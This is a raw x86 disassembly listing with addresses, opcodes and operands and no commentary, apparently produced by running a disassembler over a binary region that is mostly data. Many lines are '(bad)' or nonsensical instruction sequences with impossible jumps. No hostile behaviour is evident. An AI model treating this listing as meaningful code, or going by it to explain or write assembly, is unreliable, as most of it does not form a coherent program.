  4226d5:	add    BYTE PTR [edx+0x0],0x48
  4226d9:	sub    BYTE PTR [edx+0x0],al
  4226dc:	int3   
  4226dd:	sub    BYTE PTR [edx+0x0],al
  4226e0:	xor    al,0x27
  4226e2:	inc    edx
  4226e3:	add    BYTE PTR [eax],bh
  4226e5:	daa    
  4226e6:	inc    edx
  4226e7:	add    al,cl
  4226e9:	sub    BYTE PTR [edx+0x0],al
  4226ec:	pushf  
  4226ed:	daa    
  4226ee:	inc    edx
  4226ef:	add    BYTE PTR [edx-0x36],cl
  4226f2:	push   es
  4226f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226f4:	scas   al,BYTE PTR es:[edi]
  4226f5:	or     eax,0x2750a506
  4226fa:	inc    edx
  4226fb:	add    BYTE PTR [eax],al
  4226fd:	sub    BYTE PTR [edx+0x0],al
  422700:	adc    al,0x28
  422702:	inc    edx
  422703:	add    BYTE PTR [eax],ah
  422705:	sub    BYTE PTR [edx+0x0],al
  422708:	xor    BYTE PTR [eax],ch
  42270a:	inc    edx
  42270b:	add    BYTE PTR [eax+0x3c004227],cl
  422711:	and    eax,0x27a80042
  422716:	inc    edx
  422717:	add    BYTE PTR [eax-0x1fffbdd9],bl
  42271d:	sub    BYTE PTR [edx+0x0],al
  422720:	scas   al,BYTE PTR es:[edi]
  422721:	fwait
  422722:	push   es
  422723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422724:	cmp    BYTE PTR [edx-0x19],al
  422727:	mov    esp,0x4227b8
  42272c:	shl    BYTE PTR [edi],0x42
  42272f:	add    BYTE PTR [edi+eiz*1+0x42],bl
  422733:	add    BYTE PTR [esi+eax*4],ah
  422736:	loopne 0x4226f4
  422738:	jbe    0x4227b4
  42273a:	pop    ds
  42273b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42273c:	add    BYTE PTR [eax],al
  42273e:	inc    eax
  42273f:	add    cl,dh
  422741:	retf   
  422742:	arpl   WORD PTR [eax-0xd],bx
  422745:	add    BYTE PTR [edx+0x0],0xa8
  422749:	js     0x422733
  42274b:	push   0x77
  42274d:	push   cs
  42274e:	pop    ebx
  42274f:	xor    BYTE PTR [esi-0x6],dh
  422752:	(bad)  
  422753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422754:	mov    dl,0xd
  422756:	xchg   ebx,eax
  422757:	test   eax,0x422744
  42275c:	stos   BYTE PTR es:[edi],al
  42275d:	fild   DWORD PTR [esi]
  42275f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422760:	stos   BYTE PTR es:[edi],al
  422761:	fild   WORD PTR [esi]
  422763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422765:	fild   DWORD PTR [esi]
  422767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422768:	mov    ds:0xbea506db,al
  42276d:	fild   DWORD PTR [esi]
  42276f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422770:	mov    edx,0xb6a506db
  422775:	fild   DWORD PTR [esi]
  422777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422778:	mov    dl,0xdb
  42277a:	push   es
  42277b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42277c:	mov    ds,ebx
  42277e:	push   es
  42277f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422780:	mov    bl,bl
  422782:	push   es
  422783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422784:	out    dx,al
  422785:	fild   DWORD PTR [esi]
  422787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422788:	dec    DWORD PTR [edx]
  42278a:	adc    edi,DWORD PTR [ebx]
  42278c:	xor    al,0x25
  42278e:	inc    edx
  42278f:	add    BYTE PTR ds:0x6100422a,ah
  422795:	jae    0x4227ff
  422797:	jns    0x422747
  422799:	fwait
  42279a:	push   es
  42279b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42279c:	cmp    cl,dl
  42279e:	xlat   BYTE PTR ds:[ebx]
  42279f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227a0:	dec    sp
  4227a2:	add    BYTE PTR [eax],al
  4227a4:	xor    BYTE PTR ds:0x42220042,ah
  4227aa:	sbb    eax,DWORD PTR [ebx+0x0]
	...
  4227b8:	hlt    
  4227b9:	stc    
  4227ba:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  4227c1:	inc    esi
  4227c2:	pop    ds
  4227c3:	jg     0x4227c5
	...
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    BYTE PTR [esi+0x7e],bh
  4227ee:	inc    edx
	...
  4227fb:	add    BYTE PTR [edi-0x4c],al
  4227fe:	inc    ecx
  4227ff:	add    BYTE PTR [ebp-0x5b],cl
  422802:	push   ecx
  422803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422804:	jg     0x4227ab
  422806:	inc    edi
  422807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422808:	push   ecx
  422809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280a:	inc    ebx
  42280b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280c:	std    
  42280d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280e:	jmp    DWORD PTR [ebp+0xa59b]
  422814:	push   ebp
  422815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422816:	push   ebx
  422817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422818:	dec    ecx
  422819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281a:	std    
  42281b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422822:	jge    0x4227c9
  422824:	push   ecx
  422825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422826:	jg     0x4227cd
  422828:	std    
  422829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42282a:	jmp    DWORD PTR [ebp+0xa59b]
  422830:	jge    0x4227d7
  422832:	dec    ebx
  422833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422834:	inc    ebx
  422835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422836:	jne    0x4227dd
  422838:	pop    ecx
  422839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42283a:	jnp    0x4227e1
  42283c:	dec    ecx
  42283d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42283e:	fwait
  42283f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  422848:	xor    eax,ecx
  42284a:	xor    esp,DWORD PTR [ecx]
  42284c:	xor    eax,DWORD PTR [ecx]
  42284e:	xor    esp,DWORD PTR [ecx+0x33]
  422851:	inc    ecx
  422852:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  422858:	xor    al,cl
  42285a:	xor    ah,BYTE PTR [ecx]
  42285c:	xor    al,BYTE PTR [ecx]
  42285e:	xor    ah,BYTE PTR [ecx+0x32]
  422861:	inc    ecx
  422862:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  422868:	xor    ecx,ebp
  42286a:	xor    ecx,edi
  42286c:	xor    ecx,ecx
  42286e:	xor    ecx,ebx
  422870:	xor    edx,ebp
  422872:	xor    edx,edi
  422874:	xor    edx,ecx
  422876:	xor    edx,ebx
  422878:	xor    ebx,ebp
  42287a:	xor    ebx,edi
  42287c:	xor    ebx,ecx
  42287e:	xor    ebx,ebx
  422880:	xor    eax,edi
  422882:	push   ebx
  422883:	shl    DWORD PTR [ebx-0x3f],0x93
  422887:	rcl    BYTE PTR [esi-0x55],0x15
  42288b:	iret   
  42288c:	xchg   ebp,eax
  42288d:	dec    eax
  42288e:	xor    ecx,ebp
  422890:	sbb    eax,0x50aaaae3
  422895:	imul   ebx,DWORD PTR [esi],0x2f
  422898:	je     0x4228af
  42289a:	mov    DWORD PTR [edx+0x556ad694],ecx
  4228a0:	imul   edi,ebx,0xffffffd5
  4228a3:	enter  0x4927,0xef
  4228a7:	popf   
  4228a8:	mov    dh,0xde
  4228aa:	dec    esi
  4228ab:	xchg   esp,eax
  4228ac:	lock xor BYTE PTR [esi-0x6b],ch
  4228b0:	inc    ebp
  4228b1:	or     al,0x76
  4228b3:	or     DWORD PTR [edi-0x40],eax
  4228b6:	js     0x422872
  4228b8:	popa   
  4228b9:	pop    eax
  4228ba:	jecxz  0x422926
  4228bc:	mov    BYTE PTR [ebx-0x56],0x4
  4228c0:	cs leave 
  4228c2:	inc    esi
  4228c3:	stos   DWORD PTR es:[edi],eax
  4228c4:	inc    esp
  4228c5:	ds inc ebp
  4228c7:	enter  0x82f6,0x93
  4228cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228cc:	sbb    DWORD PTR [eax],ecx
  4228ce:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  4228d2:	inc    edx
  4228d3:	add    cl,dl
  4228d5:	ja     0x422946
  4228d7:	gs cmp al,0x27
  4228da:	inc    edx
  4228db:	add    BYTE PTR [eax+0x76004227],ah
  4228e1:	cli    
  4228e2:	fbld   TBYTE PTR [eax+eax*1+0x0]
  4228e9:	add    BYTE PTR [eax],al
  4228eb:	add    BYTE PTR [eax],al
  4228ed:	add    BYTE PTR [eax],al
  4228ef:	add    BYTE PTR [eax-0x15],bl
  4228f2:	push   ss
  4228f3:	cmp    eax,0x65646543
  4228f8:	push   esi
  4228f9:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  422901:	jb     0x422977
  422903:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  422908:	jecxz  0x4228d1
  42290a:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  42290f:	cmp    al,BYTE PTR [esi-0x2d]
  422912:	jno    0x42298e
  422914:	outs   dx,DWORD PTR ds:[esi]
  422915:	jae    0x422987
  422917:	popa   
  422918:	je     0x422982
  42291a:	bound  esp,QWORD PTR [ecx+0x73]
  42291d:	je     0x42298e
  42291f:	outs   dx,DWORD PTR ds:[esi]
  422920:	test   eax,0xde3655f5
  422925:	in     al,0x6c
  422927:	jne    0x422991
  422929:	bound  esp,QWORD PTR [ebp+0x4b]
  42292c:	popa   
  42292d:	jbe    0x422990
  42292f:	outs   dx,WORD PTR ds:[esi]
  422931:	jns    0x4229a2
  422933:	imul   edi,DWORD PTR [eax],0x2c054cf4
  422939:	pusha  
  42293a:	and    BYTE PTR [edi+0x79],dh
  42293d:	gs jo  0x4229af
  422940:	ins    DWORD PTR es:[edi],dx
  422941:	ja     0x4229bc
  422943:	gs inc ebp
  422945:	jns    0x4229ac
  422947:	jb     0x422949
	...
  422959:	add    BYTE PTR [eax],al
  42295b:	add    BYTE PTR [esi-0x4e],dl
  42295e:	and    dl,BYTE PTR [ecx]
  422960:	imul   esp,DWORD PTR [ebx+0x75],0x74
  422964:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  42296c:	fldcw  WORD PTR [eax+edx*2]
  42296f:	fimul  WORD PTR [ebx]
  422971:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  422975:	fldcw  WORD PTR [eax+0x69]
  422978:	lods   al,BYTE PTR ds:[esi]
  422979:	repnz retf 0xe41c
  42297d:	inc    ebx
  42297e:	outs   dx,DWORD PTR ds:[esi]
  42297f:	je     0x4229f4
  422981:	dec    esp
  422982:	popa   
  422983:	jp     0x4229fe
  422985:	push   ebx
  422986:	imul   esp,DWORD PTR [ecx+0x73],0x73
  42298a:	push   0xc3066a00
  42298f:	lds    eax,FWORD PTR [eax+0x6569646f]
  422995:	add    al,bl
  422997:	mov    ebp,0x2ee9d1e4
  42299c:	jle    0x422950
  42299e:	data16 gs ja 0x422a15
  4229a2:	jne    0x422a06
  4229a4:	add    BYTE PTR [eax],al
  4229a6:	add    DWORD PTR [edx+0x51cf72f8],edi
  4229ac:	fstp   DWORD PTR [eax+0x74]
  4229af:	popa   
  4229b0:	jae    0x422a24
  4229b2:	popa   
  4229b3:	js     0x422a1d
  4229b5:	outs   dx,DWORD PTR ds:[esi]
  4229b6:	add    BYTE PTR [eax],al
  4229b8:	mov    esi,0x4d270df8
  4229bd:	popa   
  4229be:	ins    BYTE PTR es:[edi],dx
  4229bf:	je     0x422a0d
  4229c1:	jne    0x422a35
  4229c3:	imul   eax,DWORD PTR [eax],0x0
  4229c6:	dec    edx
  4229c7:	loope  0x4229d7
  4229c9:	out    0xd3,al
  4229cb:	test   al,0x57
  4229cd:	popa   
  4229ce:	jb     0x422a3b
  4229d0:	jne    0x422a46
  4229d2:	outs   dx,DWORD PTR fs:[esi]
  4229d4:	bound  ebp,QWORD PTR [edi+0x0]
  4229d7:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  4229de:	jne    0x422a4d
  4229e0:	outs   dx,DWORD PTR ds:[esi]
  4229e1:	js     0x4229e3
  4229e3:	add    BYTE PTR [ecx+edx*8+0x58],ch
  4229e7:	or     bh,BYTE PTR [ecx+ebx*2]
  4229ea:	add    al,0xd6
  4229ec:	gs ins DWORD PTR es:[edi],dx
  4229ee:	jns    0x422a5f
  4229f0:	jo     0x422a67
  4229f2:	je     0x422a47
  4229f4:	push   0x6170676f
  4229f9:	jns    0x422a65
  4229fb:	outs   dx,DWORD PTR ds:[esi]
  4229fc:	popa   
  4229fd:	jns    0x4229b9
  4229ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a00:	scas   al,BYTE PTR es:[edi]
  422a01:	or     al,0xaf
  422a03:	adc    al,0x63
  422a05:	popa   
  422a06:	jns    0x422a4f
  422a08:	jne    0x422a80
  422a0a:	jae    0x422a80
  422a0c:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a13:	jb     0x422a7a
  422a15:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a19:	(bad)  
  422a1a:	out    dx,al
  422a1b:	push   ebx
  422a1c:	popa   
  422a1d:	arpl   WORD PTR [ebx+0x66],si
  422a20:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a27:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a2d:	push   eax
  422a2e:	ja     0x4229ba
  422a30:	cdq    
  422a31:	adc    bh,0x8a
  422a34:	pop    esi
  422a35:	fldenv [ecx+0x6f5038a6]
  422a3b:	adc    bh,0x8b
  422a3e:	arpl   WORD PTR [edx],si
  422a40:	test   eax,0x92fcefd7
  422a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a46:	xchg   ah,bh
  422a48:	fsubr  st,st(7)
  422a4a:	arpl   sp,di
  422a4c:	fsub   DWORD PTR [esi+0xc92fc86]
  422a52:	cdq    
  422a53:	jo     0x422ac9
  422a55:	xchg   edi,eax
  422a56:	add    BYTE PTR [edi+0x77019696],0x8b
  422a5d:	push   eax
  422a5e:	ja     0x4229ea
  422a60:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422a67:	cmp    BYTE PTR [eax+0xc],dl
  422a6a:	adc    BYTE PTR [edi-0x28089c75],0x9
  422a71:	xor    BYTE PTR [edi-0x11],0xfc
  422a75:	xchg   edx,eax
  422a76:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422a7c:	cld    
  422a7d:	xchg   edx,eax
  422a7e:	outs   dx,DWORD PTR ds:[esi]
  422a7f:	mov    ds:0x31ec92fc,eax
  422a84:	jo     0x422a81
  422a86:	out    dx,al
  422a87:	lea    edx,[edi-0x69697880]
  422a8d:	add    DWORD PTR [edi-0x75],esi
  422a90:	push   eax
  422a91:	ja     0x422a1d
  422a93:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422a9a:	hlt    
  422a9b:	push   eax
  422a9c:	or     al,0x80
  422a9e:	xchg   edi,eax
  422a9f:	mov    esp,DWORD PTR [ebx-0x9]
  422aa2:	xlat   BYTE PTR ds:[ebx]
  422aa3:	out    dx,al
  422aa4:	cld    
  422aa5:	xchg   edx,eax
  422aa6:	mov    WORD PTR [ebx],ss
  422aa8:	xor    BYTE PTR [edi-0x11],0xfc
  422aac:	xchg   edx,eax
  422aad:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422ab3:	jo     0x422ab0
  422ab5:	out    dx,al
  422ab6:	lea    edx,[edi-0x69697880]
  422abc:	add    DWORD PTR [edi-0x75],esi
  422abf:	push   eax
  422ac0:	ja     0x422a4c
  422ac2:	cdq    
  422ac3:	adc    bh,0x8a
  422ac6:	pop    esi
  422ac7:	fsubrp st(7),st
  422ac9:	xor    edi,DWORD PTR [eax+edx*2]
  422acc:	outs   dx,DWORD PTR ds:[esi]
  422acd:	adc    bh,0x8b
  422ad0:	arpl   WORD PTR [edx],si
  422ad2:	test   eax,0xd8fca6d7
  422ad7:	out    dx,al
  422ad8:	fwait
  422ad9:	mov    ecx,0x31ec927c
  422ade:	fwait
  422adf:	cld    
  422ae0:	or     al,0x43
  422ae2:	jo     0x422b58
  422ae4:	xchg   edi,eax
  422ae5:	add    BYTE PTR [edi+0x77019696],0x8b
  422aec:	push   eax
  422aed:	ja     0x422a79
  422aef:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422af6:	cmp    BYTE PTR [eax+0xc],dl
  422af9:	adc    BYTE PTR [edi-0x28089c75],0xff
  422b00:	xor    BYTE PTR [edi-0x11],0xfc
  422b04:	xchg   edx,eax
  422b05:	out    dx,eax
  422b06:	mov    ds:0x963a6dfc,eax
  422b0b:	cld    
  422b0c:	xchg   edx,eax
  422b0d:	das    
  422b0e:	stos   DWORD PTR es:[edi],eax
  422b0f:	jo     0x422b0c
  422b11:	out    dx,al
  422b12:	lea    ebx,[ebx-0x7f686c67]
  422b18:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b1e:	cmp    eax,0xd7808a0a
  422b23:	sbb    eax,0x9925d73a
  422b28:	adc    bh,0x15
  422b2b:	dec    eax
  422b2c:	shr    DWORD PTR [edx-0x12f24e71],1
  422b32:	std    
  422b33:	dec    ebp
  422b34:	xchg   esp,eax
  422b35:	test   BYTE PTR [ebx-0x9],cl
  422b38:	or     cl,BYTE PTR [edi+0x4dfded51]
  422b3e:	xchg   esp,eax
  422b3f:	test   BYTE PTR [ebx-0x9],cl
  422b42:	or     cl,BYTE PTR [esi+edi*8]
  422b45:	or     BYTE PTR ds:0x432187ed,0x6a
  422b4c:	ins    DWORD PTR es:[edi],dx
  422b4d:	or     cl,BYTE PTR [edx]
  422b4f:	or     cl,BYTE PTR [edx]
  422b51:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422b57:	adc    DWORD PTR [ebp+0x5e],ecx
  422b5a:	(bad)  
  422b5b:	in     al,dx
  422b5c:	lea    ecx,[ebp+0x10018494]
  422b62:	pop    ecx
  422b63:	mov    WORD PTR [ebp-0x1172a173],cs
  422b69:	(bad)  
  422b6a:	out    dx,al
  422b6b:	mov    dh,0xbe
  422b6d:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
  422b72:	xchg   BYTE PTR [ecx+0xc],ah
  422b75:	lea    ecx,[ebp+0x5901cbf8]
  422b7b:	add    DWORD PTR [ebx-0x80],ebp
  422b7e:	out    0x8a,eax
  422b80:	xor    BYTE PTR [edi+0x32],0x43
  422b84:	out    0x35,eax
  422b86:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422b8a:	xchg   BYTE PTR [edx-0x73],ah
  422b8d:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422b93:	dec    edi
  422b94:	repnz lea ecx,[ebp-0x370f7073]
  422b9b:	xor    esp,edi
  422b9d:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422ba4:	mov    al,ds:0xec9d8894
  422ba9:	or     eax,0xeb6501a9
  422bae:	mov    dl,0xbc
  422bb0:	out    dx,eax
  422bb1:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422bb8:	mov    eax,ds:0x99968d8d
  422bbd:	cli    
  422bbe:	lea    edi,[edx]
  422bc0:	lea    ecx,[ebp-0x1bc59df6]
  422bc6:	push   ebp
  422bc7:	and    bh,0x8a
  422bca:	inc    ebx
  422bcb:	out    0x83,eax
  422bcd:	or     eax,esp
  422bcf:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422bd6:	push   ecx
  422bd7:	xor    ecx,DWORD PTR [ebx-0x14]
  422bda:	push   ecx
  422bdb:	add    ebp,eax
  422bdd:	lock lea eax,[esi-0x7272f3a0]
  422be4:	cmp    ch,0xb2
  422be7:	mov    bh,ch
  422be9:	in     eax,dx
  422bea:	mov    edx,0xfa05633a
  422bef:	lea    edi,[edx]
  422bf1:	lea    ecx,[ebp-0x39c5e29]
  422bf7:	in     al,0x9c
  422bf9:	les    esp,FWORD PTR [edi]
  422bfb:	add    bh,0xaf
  422bfe:	xchg   cl,ch
  422c00:	or     al,0x8d
  422c02:	(bad)  
  422c03:	loop   0x422c3f
  422c05:	scas   al,BYTE PTR es:[edi]
  422c06:	in     al,dx
  422c07:	sti    
  422c08:	in     al,dx
  422c09:	ret    0x86ed
  422c0c:	cmp    ch,ch
  422c0e:	mov    BYTE PTR [edx],bh
  422c10:	sub    BYTE PTR [edx+0x63],0xfc
  422c14:	sub    BYTE PTR [edx-0x1c],0xb4
  422c18:	scas   al,BYTE PTR es:[edi]
  422c19:	fsubr  st,st(5)
  422c1b:	test   DWORD PTR [edi],ebp
  422c1d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c23:	in     eax,dx
  422c24:	test   edi,edi
  422c26:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c2c:	out    dx,al
  422c2d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422c34:	(bad)  
  422c35:	leave  
  422c36:	bound  esi,QWORD PTR [edx-0x367902f3]
  422c3c:	or     al,0x8d
  422c3e:	(bad)  
  422c3f:	xlat   BYTE PTR ds:[ebx]
  422c40:	adc    eax,0x9faeab9d
  422c45:	scas   al,BYTE PTR es:[edi]
  422c46:	lahf   
  422c47:	dec    ebp
  422c48:	push   ebp
  422c49:	xor    eax,0xb5f1aa96
  422c4e:	outs   dx,DWORD PTR ds:[esi]
  422c4f:	lea    ecx,[ebp-0x2c3b7272]
  422c55:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422c5b:	or     al,0x8d
  422c5d:	(bad)  
  422c5e:	xlat   BYTE PTR ds:[ebx]
  422c5f:	dec    ecx
  422c60:	bound  eax,QWORD PTR ds:0x1786fd0d
  422c66:	or     al,0x8d
  422c68:	(bad)  
  422c69:	xlat   BYTE PTR ds:[ebx]
  422c6a:	xchg   ebx,eax
  422c6b:	popf   
  422c6c:	mov    WORD PTR gs:[edx+0x30],fs
  422c70:	in     al,0xc
  422c72:	(bad)  
  422c73:	dec    DWORD PTR [edx]
  422c75:	adc    bh,0x8a
  422c78:	inc    ebx
  422c79:	xlat   BYTE PTR ds:[ebx]
  422c7a:	and    DWORD PTR [ebx-0x29],0x35
  422c7e:	or     edx,ebp
  422c80:	mov    dh,0x3a
  422c82:	lea    ecx,[ebp-0x75187fba]
  422c88:	cmc    
  422c89:	mov    esi,0x8d8d3adc
  422c8e:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422c94:	lea    eax,[eax+0x23d582d7]
  422c9a:	(bad)  
  422c9b:	stc    
  422c9c:	xchg   BYTE PTR [eax],cl
  422c9e:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422ca4:	aad    0x30
  422ca6:	adc    bh,0xf7
  422ca9:	xor    al,0x7a
  422cac:	push   eax
  422cad:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422cb8:	push   eax
  422cb9:	lock adc BYTE PTR [eax-0x29],0x83
  422cbe:	popf   
  422cbf:	stos   DWORD PTR es:[edi],eax
  422cc0:	lahf   
  422cc1:	icebp  
  422cc2:	mov    ebp,0x8e8d8da6
  422cc7:	out    dx,eax
  422cc8:	in     al,dx
  422cc9:	pushf  
  422cca:	stos   BYTE PTR es:[edi],al
  422ccb:	fwait
  422ccc:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422cd3:	in     al,dx
  422cd4:	or     al,BYTE PTR [eax-0x5795039]
  422cda:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422ce0:	ja     0x422c68
  422ce2:	and    bh,0xaf
  422ce5:	mov    dl,0x84
  422ce7:	in     al,dx
  422ce8:	inc    ebx
  422ce9:	jo     0x422ccd
  422ceb:	out    dx,eax
  422cec:	test   eax,0xee7be501
  422cf1:	les    edx,FWORD PTR [edi-0x80]
  422cf4:	(bad)  
  422cf5:	scas   eax,DWORD PTR es:[edi]
  422cf6:	in     eax,dx
  422cf7:	js     0x422d05
  422cf9:	xchg   BYTE PTR [eax],ch
  422cfb:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422d01:	ja     0x422c89
  422d03:	and    bh,0xaf
  422d06:	mov    dl,0x84
  422d08:	in     al,dx
  422d09:	loop   0x422cfa
  422d0b:	lahf   
  422d0c:	loop   0x422cfd
  422d0e:	test   eax,0xee7b6601
  422d13:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d19:	out    dx,al
  422d1a:	or     al,0x8d
  422d1c:	(bad)  
  422d1d:	in     al,dx
  422d1e:	out    0xaf,eax
  422d20:	loop   0x422d93
  422d22:	lahf   
  422d23:	cli    
  422d24:	lea    edi,[edx]
  422d26:	lea    ecx,[ebp+0x43f9f050]
  422d2c:	push   0x6d
  422d2e:	and    BYTE PTR [ecx-0x7a],0xbd
  422d32:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d38:	push   ecx
  422d39:	in     al,0xc6
  422d3b:	cmp    dh,al
  422d3d:	stc    
  422d3e:	in     eax,dx
  422d3f:	out    0x76,eax
  422d41:	out    dx,al
  422d42:	or     ebp,ebp
  422d44:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422d4a:	jbe    0x422cd8
  422d4c:	xor    al,0xf9
  422d4f:	in     eax,dx
  422d50:	retf   
  422d51:	out    dx,al
  422d52:	in     al,0xec
  422d54:	loop   0x422d42
  422d56:	lahf   
  422d57:	and    bh,0xfd
  422d5a:	mov    dl,0xba
  422d5c:	outs   dx,DWORD PTR ds:[esi]
  422d5d:	inc    ebx
  422d5e:	push   0x6d
  422d60:	loop   0x422dcf
  422d62:	test   eax,0xadc96601
  422d67:	in     al,dx
  422d68:	lea    ecx,[ebp+0x45866180]
  422d6e:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d74:	push   ecx
  422d75:	in     al,0xc6
  422d77:	push   eax
  422d78:	lock xchg BYTE PTR [eax-0x10],dl
  422d7c:	sub    ebp,0xffffffcb
  422d7f:	out    dx,al
  422d80:	in     al,0xd3
  422d82:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422d89:	mov    ch,ch
  422d8b:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422d90:	retf   
  422d91:	mov    eax,ds:0x225e1fd3
  422d96:	or     al,0x8d
  422d98:	lea    eax,[ebx-0x4e]
  422d9b:	adc    BYTE PTR [ecx+0x72],0xb7
  422d9f:	sub    esp,0x77
  422da2:	xor    DWORD PTR [esi-0x288137c],0x50
  422da9:	ja     0x422d5a
  422dab:	les    eax,FWORD PTR [edi-0x13]
  422dae:	mov    dh,ch
  422db0:	xchg   BYTE PTR [eax],bh
  422db2:	lea    ecx,[ebp-0x493b4973]
  422db8:	mov    bh,0x83
  422dba:	pop    edi
  422dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dbc:	test   ah,ah
  422dbe:	outs   dx,DWORD PTR ds:[esi]
  422dbf:	dec    ebp
  422dc0:	ja     0x422d45
  422dc2:	aas    
  422dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dc4:	test   BYTE PTR [ecx+0x755e86d7],dh
  422dca:	outs   dx,DWORD PTR ds:[esi]
  422dcb:	lea    ecx,[ebp+0x50fd77ec]
  422dd1:	ja     0x422d82
  422dd3:	mov    dl,0xb7
  422dd5:	sub    esi,0xffffffe2
  422dd8:	out    dx,al
  422dd9:	test   eax,0x807b4d43
  422dde:	jl     0x422d60
  422de0:	(bad)  
  422de1:	scas   eax,DWORD PTR es:[edi]
  422de2:	xchg   al,ah
  422de4:	lea    ecx,[ebp-0x2ac5c173]
  422dea:	in     al,dx
  422deb:	xor    bh,ah
  422ded:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422df4:	lea    ecx,[ebp+0x77]
  422df7:	add    DWORD PTR [eax-0x4d120610],0xc
  422dfe:	and    bh,0x8a
  422e01:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422e06:	pop    edi
  422e07:	ja     0x422d8c
  422e09:	fcmovnu st,st(2)
  422e0b:	or     BYTE PTR [ebx+0x43],0xd7
  422e0f:	add    DWORD PTR [eax-0xab9c269],0x63
  422e16:	test   ebx,edx
  422e18:	in     al,dx
  422e19:	jg     0x422df2
  422e1b:	dec    ebx
  422e1c:	push   eax
  422e1d:	out    0x8a,eax
  422e1f:	or     eax,esp
  422e21:	xor    ah,BYTE PTR [ebx-0x19]
  422e24:	cmp    eax,0xccaaea09
  422e29:	dec    ebp
  422e2a:	dec    ebp
  422e2b:	xchg   dl,dl
  422e2d:	lea    ecx,[ebp+0x16a438d]
  422e33:	lds    esi,FWORD PTR ds:0x2d978065
  422e39:	adc    bh,0x8b
  422e3c:	inc    ebx
  422e3d:	xlat   BYTE PTR ds:[ebx]
  422e3e:	sbb    eax,0x9780d450
  422e43:	inc    ebp
  422e44:	and    bh,0x8a
